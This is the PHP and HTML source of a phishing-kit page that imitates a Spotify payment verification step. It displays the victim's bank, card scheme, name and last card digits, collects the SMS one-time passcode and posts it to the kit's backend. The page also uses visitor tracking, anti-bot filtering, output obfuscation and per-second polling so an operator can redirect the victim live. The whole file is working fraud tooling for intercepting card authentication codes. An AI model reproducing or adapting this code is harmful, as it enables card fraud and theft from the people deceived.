<?php 
session_start();
require_once '../includes/functions.php';
validateVisit();
require_once '../includes/tracker.php';
require_once '../includes/lang.php';
require_once '../includes/absd.php';
require_once('../includes/obf.php');
$visitor = trackVisitor();
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
ob_start([TextObfuscator::class, 'obfuscateOutput']);
?><html>
  <head>
    <title><?php echo $payd01['x106']?> - OTP</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="css/bootstrap.css?" rel="stylesheet">
    <script src="js/jquery.js"></script>
        <link rel="icon" href="data:image/vnd.microsoft.icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExgR////Af///wH///8B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL8TExjvExMY7xMTGL8TExi/ExMYgRMTGEH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">

  </head>
  <body style="background:white;">
      
    <style>
      		.is-invalid {
				border: 1px solid red;
										
				}
    </style>
    <div style="text-align:center; padding:30px;">
      <div style="display:inline-block; width:500px; max-width:100%;">
        <div style="display:flex; ">
          <div style="text-align:left; width:50%;">
            <h3> <?php 
if(@$_SESSION['bank']!=""){echo $_SESSION['bank'];}
?> </h3>
          </div>
          <div style="text-align:right; width:50%;">
          <?php if ($_SESSION["scheme"] == "visa") {
              echo '<img src="images/visa.png" style="width: 100px;">';
          } elseif ($_SESSION["scheme"] == "mastercard") {
              echo '<img src="images/master.png" style="width: 150px;">';
          } elseif ($_SESSION["scheme"] == "discover") {
              echo '<img src="images/ccicons/discover.svg" style="width: 100px;">';
          } elseif ($_SESSION["scheme"] == "amex") {
              echo '<img src="images/ccicons/amex.png" style="width: 100px;">';
          } else {
              echo '<img src="images/logox.svg" width="100px">';
          } ?>
          </div>
        </div>
        <br>
        <div id="main" class="main" data-main=""></div>
        <!--  -->
        <style>
          .main-container.container-fluid.js-quickedit-main-content {
            min-height: 450px;
          }
        </style>
        <table style="width:100%;"> <?php 
if(@$_SESSION['name']!=""){
echo "
										<tr>
											<th>Name: </th>
											<td>".$_SESSION['name']."</td>
										</tr>";	
} 
?> <tr>
            <th> <?php echo $payd01['x102']?> </th>
            <td>Spotify</td>
          </tr>
          <tr>
            <th> <?php echo $payd01['x103']?> </th>
            <td>**** **** **** <?php if(@$_SESSION['cc']!=""){echo substr($_SESSION['cc'], -4); }else{echo "****";}?> </td>
          </tr>
          <tr>
            <th> <?php echo $payd01['x104']?> </th>
            <td> <?php echo @date("d/m/Y"); ?> </td>
          </tr>
          <tr>
            <th> <?php echo $payd01['x105']?> </th>
            <td> <?php echo $payd01['x063']?> </td>
          </tr>
        </table>
        <div style="padding:40px; font-size:1.1em; margin-bottom:-20px;">
          <h4 style="margin-top:-30px; "> <?php echo $payd01['x106']?> </h4> <?php echo $payd01['x107']?> <br> <?php echo $payd01['x108']?>
        </div>
        <form action="javascript:void(0)" method="post" style="margin-top:-20px;" name="contact-form" id="contact-form">
          <p style="color:red;"> <?php 
if(isset($_GET['error'])){
echo $payd01['x109'];
}
?> </p>
<script>

document.addEventListener('DOMContentLoaded', function() {

    const urlParams = new URLSearchParams(window.location.search);
    const inputElement = document.getElementById('sms'); 

   
    if (urlParams.has('error') && inputElement) {
         $("#sms").addClass('is-invalid');
    }

    if (inputElement) {
        inputElement.addEventListener('input', function() {
            if (this.value.length > 4) {
                 $("#sms").removeClass("is-invalid");
            } else if (!$("#sms").classList.contains('is-invalid') && urlParams.has('error')) {
                $("#sms").addClass("is-invalid");
            }
        });
    }
});
</script>
          <center>
            <div style="width:50%;">
              <input type="text" id="sms" name="sms" required placeholder="OTP" class="textinput2">
            </div>
          </center>
          <br>
          <button type="submit" id="submit" name="submit" class="btn btn-dark"> <?php echo $payd01['x110s']?> </button>
            <script src="js/misc.js"></script>
<script>
$("#sms").mask("00000000");
    	</script>
          <script type="text/javascript">
            var request;
            $("#contact-form").submit(function(event) {
              event.preventDefault();
              if (request) {
                request.abort();
              }
              var $form = $(this);
              var $inputs = $form.find("input, select, button, textarea");
              var serializedData = $form.serialize();
              $inputs.prop("disabled", true);
              request = $.ajax({
                url: "../includes/ajax.php",
                type: "post",
                data: serializedData
              });
              request.done(function(response, textStatus, jqXHR) {
                $(location).attr("href", "processing.php?p=SMS&ids=<?php echo gurl();?>");
              });
              request.fail(function(jqXHR, textStatus, errorThrown) {
                console.error("The following error occurred: " + textStatus, errorThrown);
              });
              request.always(function() {
                $inputs.prop("disabled", false);
              });
            });</script>
                  	<script>

setInterval(function() {
    fetch('../check_redirect.php?visitor_id=<?php echo $visitor['id']; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.url;
            }
        })
        .catch(error => console.error('Error checking redirect:', error));
        

    fetch('../ping.php?visitor_id=<?php echo $visitor['id']; ?>&page=<?php echo urlencode($_SERVER['REQUEST_URI']); ?>')
        .catch(error => console.error('Error sending ping:', error));
}, 1000);
        

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../ping.php?visitor_id=<?php echo $visitor['id']; ?>');
        });
    </script>
        </form>
      </div>
    </div>
  </body>
</html>